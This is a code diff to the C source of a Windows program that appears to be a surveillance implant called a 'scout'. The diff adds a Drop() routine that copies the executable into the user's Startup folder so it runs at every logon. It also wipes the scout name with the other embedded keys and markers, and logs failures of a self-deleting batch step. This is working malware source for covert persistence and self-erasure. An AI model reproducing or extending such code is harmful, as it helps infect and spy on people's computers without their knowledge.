@@ -1,6 +1,7 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <Shlobj.h>
+#include <Shlwapi.h>
 
 #include "main.h"
 #include "api.h"
@@ -13,6 +14,7 @@
 #pragma comment(lib, "netapi32")
 #pragma comment(lib, "gdiplus")
 #pragma comment(lib, "shell32")
+#pragma comment(lib, "shlwapi")
 
 extern VOID SyncThreadFunction();
 
@@ -25,25 +27,43 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 	MessageBox(NULL, L"_DEBUG_BINPATCH", L"_DEBUG_BINPATCH", 0);
 #endif
 
-	PWCHAR pStartupPath = (PWCHAR)malloc(32767 * sizeof(WCHAR));
-	//SHGetFolderPath(NULL, CSIDL_STARTUP|CSIDL_FLAG_CREATE, NULL, 0, pStartupPath);
-	SHGetSpecialFolderPath(NULL, pStartupPath, CSIDL_STARTUP, FALSE);
-	MessageBox(NULL, pStartupPath, pStartupPath, 0);
+	
 
-	// FIXME: DROP CSIDL_STARTUP SHGetFolderPath
 	// FIXME: decidere quanto waitare
-	// FIME: cambiare stringhe device.
 	// FIXME: bailout && malloc && free
+
 	if (GetCurrentProcessId() == 4)
 		MessageBox(NULL, L"I'm going to start the program", L"Warning", 0);
 
 	UseLess();
 	WaitForInput();
+	Drop();
 	
 	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SyncThreadFunction, NULL, 0, NULL);
 	WaitForSingleObject(hThread, INFINITE);
 }
 
+VOID Drop()
+{
+	PWCHAR pStartupPath = (PWCHAR)malloc(32767 * sizeof(WCHAR));
+	SHGetSpecialFolderPath(NULL, pStartupPath, CSIDL_STARTUP, TRUE); // TRUE == CREATE
+
+	PWCHAR pCurrentPath = (PWCHAR)malloc(32767 * sizeof(WCHAR));
+	GetModuleFileName(NULL, pCurrentPath, 32767);
+
+	*(StrRChr(pCurrentPath, NULL, L'\\')) = 0;
+	
+	if (StrCmpI(pCurrentPath, pStartupPath))
+	{
+		GetModuleFileName(NULL, pCurrentPath, 32767);
+
+		PWCHAR pFullName = (PWCHAR)malloc(32767 * sizeof(WCHAR));
+		memset(pFullName, 0x0, 32767*sizeof(WCHAR));
+		_swprintf(pFullName, L"%s\\%S.exe", pStartupPath, SCOUT_NAME);
+		
+		CopyFile(pCurrentPath, pFullName, FALSE);
+	}
+}
 
 VOID UseLess()
 {
@@ -55,6 +75,7 @@ VOID UseLess()
 		memset(WMARKER, 0x0, 3);
 		memset(CLIENT_KEY, 0x0, 3);
 		memset(ENCRYPTION_KEY_CONF, 0x0, 3);
+		memset(SCOUT_NAME, 0x0, 3);
 	}
 }
 
@@ -144,10 +165,7 @@ VOID DeleteAndDie()
 		ExitProcess(0);
 #ifdef _DEBUG
 	else
-	{
-		//ULONG bu = GetLastError();
-		//printf("%08x\n", GetLastError());
-	}
+		OutputDebugString(L"[!!] Error executing autodelete batch!!\n");
 #endif
 
 	free(pTempPath);
